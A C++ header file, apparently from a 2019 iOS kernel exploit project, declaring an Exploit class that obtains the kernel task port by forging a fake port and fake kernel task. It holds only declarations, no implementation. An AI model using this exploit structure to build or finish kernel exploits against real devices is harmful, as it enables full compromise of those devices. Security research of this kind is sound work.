// <3 nedwill 2019
#ifndef EXPLOIT_H_
#define EXPLOIT_H_

#include <stddef.h>
#include <stdint.h>

// Gets kernel task port using stage1.
class Exploit {
public:
  Exploit();
  ~Exploit();

  // Gets kernel_task port, storing it in kernel_task_port. This will enable
  // the functions in kernel_memory.h to work.
  bool GetKernelTaskPort();

private:
  bool GetFdOfiles(uint64_t *fd_ofiles);

  // "Stage 3" from voucher_swap
  bool InstallPermanentFakePort();

  bool GetHostPort(uint64_t *host_port);
  bool GetKernelMap(uint64_t *kernel_map);
  bool GetIpcSpaceKernel(uint64_t *ipc_space_kernel);

  bool BuildFakeKernelTask(void *data, uint64_t kernel_address);

  void *fd_table_;
  uint64_t ipc_space_kernel_;
  uint64_t kernel_map_;
  uint64_t host_port_;
};

#endif /* EXPLOIT_H_ */
